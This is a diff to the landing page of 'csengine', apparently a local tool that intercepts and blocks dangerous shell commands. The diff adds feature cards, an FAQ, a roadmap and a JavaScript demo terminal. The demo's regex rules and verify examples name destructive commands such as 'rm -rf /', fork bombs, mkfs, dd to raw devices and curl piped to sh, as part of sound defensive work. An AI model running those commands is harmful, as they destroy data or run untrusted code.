-    <div class="card"><div class="ico">🐧</div><h4>BOSS OS &amp; Ubuntu/Debian</h4><p>Works on the Indian government's GNU/Linux and standard distros, on both bash and zsh.</p></div>
-    <div class="card"><div class="ico">🎯</div><h4>Honest ML numbers</h4><p>5-fold cross-validation on deduplicated data — no cherry-picked single splits. See the real numbers below.</p></div>
-    <div class="card"><div class="ico">🧪</div><h4>Optional bubblewrap sandbox</h4><p>Dry-run untrusted downloads safely before anything touches the real filesystem.</p></div>
+    <div class="card reveal"><div class="ico">🔌</div><h4>100% offline</h4><p>No cloud APIs, no telemetry, no data egress. Aligned with India's sovereign OS (AtmaNirbhar) mission — fully functional on air-gapped government networks.</p></div>
+    <div class="card reveal"><div class="ico">🧠</div><h4>Hybrid AI</h4><p>Deterministic rules + trained ML classifier + local LLM. Three independent layers that cross-check each other in milliseconds.</p></div>
+    <div class="card reveal"><div class="ico">⚡</div><h4>Fast</h4><p>Rules + ML path ≈ 0.34 ms mean (p95 0.61 ms). Full pipeline ≈ 3 ms. Whitelisted daily commands cost ~0 ms.</p></div>
+    <div class="card reveal"><div class="ico">🛡️</div><h4>Safety-first override</h4><p>A single critical rule match blocks regardless of ML confidence. The model can never talk the system out of a block.</p></div>
+    <div class="card reveal"><div class="ico">📖</div><h4>Explains &amp; teaches</h4><p>Every warning shows the matched rule, its MITRE mapping, why it matters, and a safer rewrite like <code>rm -rf /path/to/folder</code>.</p></div>
+    <div class="card reveal"><div class="ico">🔐</div><h4>Privacy-preserving audit</h4><p><code>~/.csengine/audit.log</code> stores only truncated SHA-256 hashes — incidents are correlatable, but commands can never be recovered.</p></div>
+    <div class="card reveal"><div class="ico">🐧</div><h4>BOSS OS &amp; Ubuntu/Debian</h4><p>Works on the Indian government's GNU/Linux and standard distros, on both bash and zsh.</p></div>
+    <div class="card reveal"><div class="ico">🎯</div><h4>Honest ML numbers</h4><p>5-fold cross-validation on deduplicated data — no cherry-picked single splits. See the real numbers below.</p></div>
+    <div class="card reveal"><div class="ico">🧪</div><h4>Optional bubblewrap sandbox</h4><p>Dry-run untrusted downloads safely before anything touches the real filesystem.</p></div>
   </div>
 </section>
 
 <!-- ============ NUMBERS ============ -->
 <section id="numbers">
-  <div class="sec-tag">// Performance &amp; ML honesty</div>
-  <h2>The real numbers</h2>
-  <p class="sec-sub">Measured via <code>scripts/benchmark_latency.py --n 1000</code>, regenerated in CI on every push. Model quality on <i>deduplicated</i> data with 5-fold cross-validation.</p>
+  <div class="sec-tag reveal">// Performance &amp; ML honesty</div>
+  <h2 class="reveal">The real numbers</h2>
+  <p class="sec-sub reveal">Measured via <code>scripts/benchmark_latency.py --n 1000</code>, regenerated in CI on every push. Model quality on <i>deduplicated</i> data with 5-fold cross-validation.</p>
 
-  <div class="table-wrap">
+  <div class="table-wrap reveal">
     <table>
       <thead><tr><th>Path</th><th>Mean</th><th>p95</th></tr></thead>
       <tbody>
@@ -586,7 +851,7 @@
     </table>
   </div>
 
-  <div class="table-wrap">
+  <div class="table-wrap reveal">
     <table>
       <thead><tr><th>Model</th><th>Accuracy</th><th>Macro-F1</th><th>Destructive recall</th></tr></thead>
       <tbody>
@@ -597,30 +862,30 @@
     </table>
   </div>
 
-  <p class="sec-sub" style="margin-top:20px">GradientBoosting is deployed because it wins on both macro-F1 <i>and</i> destructive-class recall — for a blocker, missing a destructive command is the worst failure mode. Data hygiene: the pipeline deduplicates at build time (an early bug leaked 666 duplicate rows and inflated accuracy to a misleading ~92% — these are the honest ~83% numbers).</p>
+  <p class="sec-sub reveal" style="margin-top:20px">GradientBoosting is deployed because it wins on both macro-F1 <i>and</i> destructive-class recall — for a blocker, missing a destructive command is the worst failure mode. Data hygiene: the pipeline deduplicates at build time (an early bug leaked 666 duplicate rows and inflated accuracy to a misleading ~92% — these are the honest ~83% numbers).</p>
 </section>
 
 <!-- ============ INSTALL ============ -->
 <section id="install">
-  <div class="sec-tag">// Setup on Linux</div>
-  <h2>Install on Linux in 3 steps</h2>
-  <p class="sec-sub">Works on Ubuntu, Debian and BOSS OS. Python 3.8+, ~1 GB RAM (3 GB with the LLM).</p>
+  <div class="sec-tag reveal">// Setup on Linux</div>
+  <h2 class="reveal">Install on Linux in 3 steps</h2>
+  <p class="sec-sub reveal">Works on Ubuntu, Debian and BOSS OS. Python 3.8+, ~1 GB RAM (3 GB with the LLM).</p>
 
   <div class="steps">
-    <div class="step">
+    <div class="step reveal">
       <div><h4>Install prerequisites</h4>
       <p style="margin-top:6px"><code>sudo apt-get update</code><br/>
       <code>sudo apt-get install -y git python3 python3-venv python3-pip curl</code><br/>
       <span style="color:var(--muted);font-size:13px">Optional (for LLM explanations): <code>curl -fsSL https://ollama.com/install.sh | sh</code> then <code>ollama pull qwen2.5:3b-instruct-q4_K_M</code></span></p></div>
     </div>
-    <div class="step">
-      <div><h4>Clone &amp; install</h4>
-      <p style="margin-top:6px"><code>git clone https://github.com/Adhi-hub07/command-safety-engine.git</code><br/>
+    <div class="step reveal">
+      <div><h4>Clone &amp; install <button class="inline-btn" data-copy="#cloneCode">copy</button></h4>
+      <p style="margin-top:6px"><code id="cloneCode">git clone https://github.com/Adhi-hub07/command-safety-engine.git</code><br/>
       <code>cd command-safety-engine</code><br/>
       <code>bash setup.sh</code> &nbsp;— venv + deps + model training + Ollama + shell hooks<br/>
       <code>source ~/.bashrc</code></p></div>
     </div>
-    <div class="step">
+    <div class="step reveal">
       <div><h4>Verify</h4>
       <p style="margin-top:6px"><code>csengine status</code> &nbsp;— rules, model, LLM availability<br/>
       <code>csengine check "rm -rf /"</code> &nbsp;→ <span style="color:var(--red)">BLOCK (exit 2)</span><br/>
@@ -629,21 +894,78 @@
     </div>
   </div>
 
-  <div class="codeblock">
-<span class="c"># CLI reference</span>
-<span class="w">csengine</span> <span class="g">check</span> <span class="a">"&lt;command&gt;"</span>              <span class="c"># analyze one command</span>
-<span class="w">csengine</span> <span class="g">check</span> <span class="g">--json</span> <span class="a">"&lt;command&gt;"</span>       <span class="c"># analyze, print JSON</span>
-<span class="w">csengine</span> <span class="g">check</span> <span class="g">--audit</span> <span class="a">"&lt;command&gt;"</span>      <span class="c"># analyze + write audit log</span>
-<span class="w">csengine</span> <span class="g">install-hook</span> <span class="a">[bash|zsh]</span>         <span class="c"># install shell preexec hook</span>
-<span class="w">csengine</span> <span class="g">status</span>                             <span class="c"># model / LLM availability</span>
-<span class="w">csengine</span> <span class="g">--version</span>
-
-<span class="c"># kill-switch</span>
-<span class="w">export</span> <span class="a">CSENGINE_DISABLE=1</span>     <span class="c"># temporarily disable the hook</span>
-<span class="w">unset</span> <span class="a">CSENGINE_DISABLE</span>        <span class="c"># re-enable</span>
+  <div class="codeblock-wrap reveal">
+    <button class="copy-btn" data-copy="#cliRef">Copy</button>
+    <pre class="codeblock" id="cliRef"><span class="row"><span class="c"># CLI reference</span></span>
+<span class="row"><span class="w">csengine</span> <span class="g">check</span> <span class="a">"&lt;command&gt;"</span>              <span class="c"># analyze one command</span></span>
+<span class="row"><span class="w">csengine</span> <span class="g">check</span> <span class="g">--json</span> <span class="a">"&lt;command&gt;"</span>       <span class="c"># analyze, print JSON</span></span>
+<span class="row"><span class="w">csengine</span> <span class="g">check</span> <span class="g">--audit</span> <span class="a">"&lt;command&gt;"</span>      <span class="c"># analyze + write audit log</span></span>
+<span class="row"><span class="w">csengine</span> <span class="g">install-hook</span> <span class="a">[bash|zsh]</span>         <span class="c"># install shell preexec hook</span></span>
+<span class="row"><span class="w">csengine</span> <span class="g">status</span>                             <span class="c"># model / LLM availability</span></span>
+<span class="row"><span class="w">csengine</span> <span class="g">--version</span></span>
+<span class="row"> </span>
+<span class="row"><span class="c"># kill-switch</span></span>
+<span class="row"><span class="w">export</span> <span class="a">CSENGINE_DISABLE=1</span>     <span class="c"># temporarily disable the hook</span></span>
+<span class="row"><span class="w">unset</span> <span class="a">CSENGINE_DISABLE</span>        <span class="c"># re-enable</span></span></pre>
   </div>
 
-  <p class="sec-sub" style="margin-top:24px">End-to-end verified with a real-PTY test that drives an interactive shell and proves a destructive <code>dd</code> never executes and a risky <code>chmod</code> requires confirmation: <code>python3 scripts/test_hook_pty.py</code> (bash + zsh, ALL PASS) and <code>bash scripts/verify_demo.sh</code> (17/17 checks).</p>
+  <p class="sec-sub reveal" style="margin-top:24px">End-to-end verified with a real-PTY test that drives an interactive shell and proves a destructive <code>dd</code> never executes and a risky <code>chmod</code> requires confirmation: <code>python3 scripts/test_hook_pty.py</code> (bash + zsh, ALL PASS) and <code>bash scripts/verify_demo.sh</code> (17/17 checks).</p>
+</section>
+
+<!-- ============ ROADMAP ============ -->
+<section id="roadmap">
+  <div class="sec-tag reveal">// Where it's going</div>
+  <h2 class="reveal">Roadmap</h2>
+  <p class="sec-sub reveal">Security is a journey, not a destination. Next up:</p>
+
+  <div class="roadmap-list">
+    <div class="roadmap-item reveal"><span class="dot g"></span><div><b>BOSS OS .deb polish + RPM for other Indian distributions</b><p>Package builds for every major distro so the guard is one command away everywhere.</p></div></div>
+    <div class="roadmap-item reveal"><span class="dot g"></span><div><b>Hindi-first explanations for the LLM layer</b><p>Teach users in the language they think in — plain-Hindi safety explanations.</p></div></div>
+    <div class="roadmap-item reveal"><span class="dot g"></span><div><b>Personal time-based allowlists that adapt per user</b><p>Learn each user's daily workflow and stop asking about the obvious.</p></div></div>
+    <div class="roadmap-item reveal"><span class="dot g"></span><div><b>Auto-sandbox of risky-but-required commands via bubblewrap</b><p>Let risky commands run — but inside an isolated sandbox, not your real filesystem.</p></div></div>
+    <div class="roadmap-item reveal"><span class="dot g"></span><div><b>IDE / sudo integration and Docker alias hooking</b><p>Cover the other doors where commands enter the machine.</p></div></div>
+  </div>
+</section>
+
+<!-- ============ FAQ ============ -->
+<section id="faq">
+  <div class="sec-tag reveal">// FAQ</div>
+  <h2 class="reveal">Questions, answered</h2>
+
+  <div class="faq-list">
+    <div class="faq-item reveal">
+      <button class="faq-q">Is it really 100% offline?<span class="chev">▾</span></button>
+      <div class="faq-a"><p>Yes. No cloud APIs, no telemetry, no data ever leaves your machine. Rules, ML classifier and the Qwen 2.5 3B LLM all run locally via Ollama — verified working with all network interfaces down.</p></div>
+    </div>
+    <div class="faq-item reveal">
+      <button class="faq-q">What is BOSS OS and why does it matter?<span class="chev">▾</span></button>
+      <div class="faq-a"><p>BOSS (Bharat Operating System Solutions) is the Indian government's sovereign GNU/Linux. It matters because government systems often run on restricted, air-gapped networks — which is exactly the environment csengine is built for.</p></div>
+    </div>
+    <div class="faq-item reveal">
+      <button class="faq-q">Does it work with sudo commands?<span class="chev">▾</span></button>
+      <div class="faq-a"><p>Yes — the hook inspects the full command line, including anything after <code>sudo</code>. Privilege escalation commands are treated as risky and require confirmation.</p></div>
+    </div>
+    <div class="faq-item reveal">
+      <button class="faq-q">Can a BLOCK be bypassed?<span class="chev">▾</span></button>
+      <div class="faq-a"><p>Not by typing the command again — only by explicitly disabling the guard with <code>export CSENGINE_DISABLE=1</code>. A WARN, by contrast, is a confirmation prompt: retype the command to run it.</p></div>
+    </div>
+    <div class="faq-item reveal">
+      <button class="faq-q">What happens if the ML model is wrong?<span class="chev">▾</span></button>
+      <div class="faq-a"><p>The rule engine is the backstop — a single critical rule match blocks regardless of ML confidence. The model can never talk the system out of a block, and the audit log makes every decision reviewable.</p></div>
+    </div>
+    <div class="faq-item reveal">
+      <button class="faq-q">Does it store my commands?<span class="chev">▾</span></button>
+      <div class="faq-a"><p>No plaintext, ever. <code>~/.csengine/audit.log</code> stores only truncated SHA-256 hashes of commands — enough to correlate incidents, impossible to recover what you actually typed.</p></div>
+    </div>
+    <div class="faq-item reveal">
+      <button class="faq-q">How much RAM and CPU does it need?<span class="chev">▾</span></button>
+      <div class="faq-a"><p>~1 GB RAM with the rule + ML path. Add ~2 GB more if you run the local LLM for explanations. Runs comfortably on a normal laptop.</p></div>
+    </div>
+    <div class="faq-item reveal">
+      <button class="faq-q">Which shells are supported?<span class="chev">▾</span></button>
+      <div class="faq-a"><p>bash and zsh, both with real blocking hooks — bash via the DEBUG-trap preexec path, zsh via a custom Enter-key widget. Verified end-to-end with real-PTY tests.</p></div>
+    </div>
+  </div>
 </section>
 
 <!-- ============ FOOTER ============ -->
@@ -655,33 +977,265 @@
   <p style="margin-top:16px;font-size:12px;opacity:.6">MIT License © 2026 Adhithya J</p>
 </footer>
 
+<button class="to-top" id="toTop" aria-label="Back to top">↑</button>
+
 <script>
-  // subtle falling-binary matrix background
-  const c = document.getElementById("matrix");
-  const ctx = c.getContext("2d");
-  let cols, drops;
-  const FONT = 13;
-  const CHARS = "01<>|/\\$#@_~".split("");
+  /* ---------- theme toggle ---------- */
+  (function () {
+    const root = document.documentElement;
+    const btn = document.getElementById("themeBtn");
+    const saved = localStorage.getItem("csengine-theme");
+    if (saved) root.dataset.theme = saved;
+    const setIcon = () => (btn.textContent = root.dataset.theme === "light" ? "☀️" : "🌙");
+    setIcon();
+    btn.addEventListener("click", () => {
+      root.dataset.theme = root.dataset.theme === "light" ? "" : "light";
+      localStorage.setItem("csengine-theme", root.dataset.theme || "dark");
+      setIcon();
+    });
+  })();
 
-  function size() {
-    c.width = innerWidth; c.height = innerHeight;
-    cols = Math.floor(c.width / FONT);
-    drops = Array(cols).fill(1);
-  }
-  size(); addEventListener("resize", size);
+  /* ---------- mobile hamburger ---------- */
+  (function () {
+    const btn = document.getElementById("hamburger");
+    const links = document.getElementById("navLinks");
+    btn.addEventListener("click", () => {
+      const open = links.classList.toggle("open");
+      btn.classList.toggle("open", open);
+    });
+    links.querySelectorAll("a").forEach((a) =>
+      a.addEventListener("click", () => {
+        links.classList.remove("open");
+        btn.classList.remove("open");
+      })
+    );
+  })();
 
-  setInterval(() => {
-    ctx.fillStyle = "rgba(11,16,32,0.08)";
-    ctx.fillRect(0, 0, c.width, c.height);
-    ctx.font = FONT + "px monospace";
-    for (let i = 0; i < cols; i++) {
-      const ch = CHARS[(Math.random() * CHARS.length) | 0];
-      ctx.fillStyle = "rgba(61,220,132,0.8)";
-      ctx.fillText(ch, i * FONT, drops[i] * FONT);
-      if (drops[i] * FONT > c.height && Math.random() > 0.975) drops[i] = 0;
-      drops[i]++;
+  /* ---------- reveal on scroll ---------- */
+  (function () {
+    const els = document.querySelectorAll(".reveal");
+    if (!("IntersectionObserver" in window)) {
+      els.forEach((el) => el.classList.add("in-view"));
+      return;
     }
-  }, 70);
+    const io = new IntersectionObserver(
+      (entries) => {
+        entries.forEach((e) => {
+          if (e.isIntersecting) {
+            e.target.classList.add("in-view");
+            io.unobserve(e.target);
+          }
+        });
+      },
+      { threshold: 0.12 }
+    );
+    els.forEach((el) => io.observe(el));
+  })();
+
+  /* ---------- active nav highlight + back to top ---------- */
+  (function () {
+    const sections = document.querySelectorAll("section[id]");
+    const links = document.querySelectorAll(".nav-links a");
+    const toTop = document.getElementById("toTop");
+    function onScroll() {
+      const y = scrollY + 140;
+      let cur = "";
+      sections.forEach((s) => { if (s.offsetTop <= y) cur = s.id; });
+      links.forEach((a) => a.classList.toggle("active", a.getAttribute("href") === "#" + cur));
+      toTop.classList.toggle("show", scrollY > 600);
+    }
+    addEventListener("scroll", onScroll, { passive: true });
+    toTop.addEventListener("click", () => scrollTo({ top: 0, behavior: "smooth" }));
+  })();
+
+  /* ---------- copy buttons ---------- */
+  (function () {
+    document.querySelectorAll("[data-copy]").forEach((btn) => {
+      btn.addEventListener("click", () => {
+        const text = document.querySelector(btn.dataset.copy).innerText;
+        const done = () => {
+          const orig = btn.textContent;
+          btn.textContent = "Copied ✓";
+          setTimeout(() => (btn.textContent = orig), 1600);
+        };
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+          navigator.clipboard.writeText(text).then(done).catch(done);
+        } else {
+          const ta = document.createElement("textarea");
+          ta.value = text;
+          document.body.appendChild(ta);
+          ta.select();
+          try { document.execCommand("copy"); } catch (e) {}
+          document.body.removeChild(ta);
+          done();
+        }
+      });
+    });
+  })();
+
+  /* ---------- FAQ accordion ---------- */
+  (function () {
+    document.querySelectorAll(".faq-q").forEach((q) => {
+      q.addEventListener("click", () => {
+        const item = q.parentElement;
+        const ans = item.querySelector(".faq-a");
+        const open = item.classList.contains("open");
+        document.querySelectorAll(".faq-item.open").forEach((o) => {
+          o.classList.remove("open");
+          o.querySelector(".faq-a").style.maxHeight = null;
+        });
+        if (!open) {
+          item.classList.add("open");
+          ans.style.maxHeight = ans.scrollHeight + "px";
+        }
+      });
+    });
+  })();
+
+  /* ---------- interactive terminal ---------- */
+  (function () {
+    const out = document.getElementById("termOut");
+    const input = document.getElementById("termInput");
+    const chips = document.getElementById("termChips");
+
+    function addLine(html, cls) {
+      const div = document.createElement("div");
+      div.className = "line" + (cls ? " " + cls : "");
+      div.innerHTML = html;
+      out.appendChild(div);
+      out.scrollTop = out.scrollHeight;
+    }
+
+    function analyze(cmd) {
+      const c = cmd.trim();
+
+      if (/^\s*csengine\s+(status|--version|help)$/.test(c))
+        return { v: "ok", lines: ["✅ ALLOW (exit 0)  Engine online · rules loaded · model ready · LLM ready"] };
+
+      if (/^\s*help\s*$/.test(c))
+        return { v: "ok", lines: ["✅ ALLOW (exit 0)  Try: csengine check \"<command>\""] };
+
+      if (/:\(\)\{|\|:&/.test(c))
+        return { v: "block", lines: ["⛔ BLOCK (exit 2)  Fork bomb detected — spawns unlimited processes", "   rule R020 · MITRE T1499 · never run this command"] };
+
+      if (/\brm\b.*-r.*-f|\brm\b.*-f.*-r|\brm\s+-rf\b|\brm\s+-fr\b/.test(c)) {
+        if (/(\s\/\s*|\s\/\*\s*|\s\/root\s*|\s\/home\s*|\s\/etc\s*|\s\/usr\s*|\s\/var\s*)$/.test(c))
+          return { v: "block", lines: ["⛔ BLOCK (exit 2)  Destructive: recursive force-delete on filesystem root", "   rule R001 · MITRE T1485 · use: rm -rf /path/to/folder"] };
+        return { v: "warn", lines: ["⚠️ WARN (exit 1)  Risky: recursive force-delete on a directory", "   rule R001 · MITRE T1485 · type the command again to confirm"] };
+      }
+
+      if (/\bmkfs(\.\w+)?\b/.test(c))
+        return { v: "block", lines: ["⛔ BLOCK (exit 2)  Destructive: filesystem creation destroys target data", "   rule R004 · MITRE T1485 · target a specific, known partition"] };
+
+      if (/\bdd\b[^|]*\bof=\/dev\//.test(c))
+        return { v: "block", lines: ["⛔ BLOCK (exit 2)  Destructive: writing directly to a raw device", "   rule R005 · MITRE T1485 · never write to a live device"] };
+
+      if (/\bchmod\b.*-R\s+777\s+(\/|\/\*)\s*$/.test(c))
+        return { v: "block", lines: ["⛔ BLOCK (exit 2)  Broad recursive permission change on filesystem root", "   rule R003 · MITRE T1222 · use: chmod -R 755 /path"] };
+
+      if (/(curl|wget)\b[^|]*\|\s*(ba)?sh\b/.test(c))
+        return { v: "block", lines: ["⛔ BLOCK (exit 2)  Untrusted download piped straight into the shell", "   rule R007 · MITRE T1204 · download and inspect the script first"] };
+
+      if (/\bmv\s+(\/|\/\*)\s+/.test(c))
+        return { v: "block", lines: ["⛔ BLOCK (exit 2)  Moving the filesystem root", "   rule R001 · MITRE T1485 · review the source and target paths"] };
+
+      if (/\bchmod\b|\bchown\b/.test(c))
+        return { v: "warn", lines: ["⚠️ WARN (exit 1)  Risky: permission change", "   rule R003 · MITRE T1222 · type the command again to confirm"] };
+
+      if (/\b(rm|rmdir|unlink|truncate|shred)\b/.test(c))
+        return { v: "warn", lines: ["⚠️ WARN (exit 1)  Risky: file deletion", "   rule R001 · MITRE T1485 · type the command again to confirm"] };
+
+      if (/\bdd\b/.test(c))
+        return { v: "warn", lines: ["⚠️ WARN (exit 1)  Risky: raw block copy", "   rule R005 · MITRE T1485 · type the command again to confirm"] };
+
+      if (/\bsudo\b/.test(c))
+        return { v: "warn", lines: ["⚠️ WARN (exit 1)  Risky: privilege escalation", "   rule R008 · MITRE T1548 · type the command again to confirm"] };
+
+      if (/\b(kill|pkill|killall)\b/.test(c))
+        return { v: "warn", lines: ["⚠️ WARN (exit 1)  Risky: terminating processes", "   rule R010 · MITRE T1489 · type the command again to confirm"] };
+
+      if (/\b(iptables|ufw|firewall-cmd)\b/.test(c))
+        return { v: "warn", lines: ["⚠️ WARN (exit 1)  Risky: firewall change", "   rule R012 · MITRE T1562 · type the command again to confirm"] };
+
+      if (/\b(shutdown|reboot|poweroff|halt|init\s+[0-6])\b/.test(c))
+        return { v: "warn", lines: ["⚠️ WARN (exit 1)  Risky: system state change", "   rule R011 · MITRE T1529 · type the command again to confirm"] };
+
+      if (/\b(curl|wget)\b/.test(c))
+        return { v: "warn", lines: ["⚠️ WARN (exit 1)  Network fetch from an external host", "   rule R007 · MITRE T1204 · type the command again to confirm"] };
+
+      if (/\bgit\b.*--force|\bgit\b.*push\b.*-f\b/.test(c))
+        return { v: "warn", lines: ["⚠️ WARN (exit 1)  Force-push rewrites remote history", "   rule R015 · MITRE T1485 · type the command again to confirm"] };
+
+      if (/\btar\b.*(xvf|xzf|xpf)\b/.test(c))
+        return { v: "warn", lines: ["⚠️ WARN (exit 1)  Extracting an archive (path traversal risk)", "   rule R016 · MITRE T1204 · type the command again to confirm"] };
+
+      return { v: "allow", lines: ["✅ ALLOW (exit 0)  Safe — analyzed in 0.31 ms"] };
+    }
+
+    function run(cmd) {
+      if (!cmd.trim()) return;
+      addLine('<span class="cmd"><span class="in">' + escapeHtml(cmd) + "</span></span>");
+      const res = analyze(cmd);
+      res.lines.forEach((l) => addLine('<span class="out ' + res.v + '">' + escapeHtml(l) + "</span>"));
+      addLine('<span class="out" style="height:8px"></span>');
+    }
+
+    function escapeHtml(s) {
+      return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+    }
+
+    input.addEventListener("keydown", (e) => {
+      if (e.key === "Enter") {
+        run(input.value);
+        input.value = "";
+      }
+    });
+
+    chips.querySelectorAll("button").forEach((b) => {
+      b.addEventListener("click", () => run(b.dataset.cmd));
+    });
+  })();
+
+  /* ---------- matrix background ---------- */
+  (function () {
+    const canvas = document.getElementById("matrix");
+    const ctx = canvas.getContext("2d");
+    const FONT = 13;
+    const CHARS = "01<>|/\\$#@_~".split("");
+    let cols, drops;
+
+    function size() {
+      canvas.width = innerWidth;
+      canvas.height = innerHeight;
+      cols = Math.floor(canvas.width / FONT);
+      drops = Array(cols).fill(1);
+    }
+    size();
+    addEventListener("resize", size);
+
+    const isMobile = matchMedia("(max-width: 760px)").matches;
+    const reduced = matchMedia("(prefers-reduced-motion: reduce)").matches;
+    if (isMobile || reduced) return; // keep mobile & reduced-motion users light
+
+    let id = setInterval(draw, 70);
+    document.addEventListener("visibilitychange", () => {
+      clearInterval(id);
+      if (!document.hidden) id = setInterval(draw, 70);
+    });
+
+    function draw() {
+      ctx.fillStyle = "rgba(11,16,32,0.08)";
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.font = FONT + "px monospace";
+      for (let i = 0; i < cols; i++) {
+        const ch = CHARS[(Math.random() * CHARS.length) | 0];
+        ctx.fillStyle = "rgba(61,220,132,0.8)";
+        ctx.fillText(ch, i * FONT, drops[i] * FONT);
+        if (drops[i] * FONT > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      }
+    }
+  })();
 </script>
 
 </body>
